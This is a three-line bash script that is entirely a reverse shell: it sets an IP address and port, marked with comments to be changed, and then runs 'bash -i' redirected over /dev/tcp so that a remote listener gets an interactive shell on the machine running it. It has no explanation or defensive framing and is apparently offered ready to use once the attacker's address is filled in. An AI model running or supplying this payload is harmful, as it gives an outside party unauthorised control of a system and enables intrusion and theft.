IP="127.0.0.1" #change
PORT=1290 #change too

bash -i >& /dev/tcp/$IP/$PORT 0>&1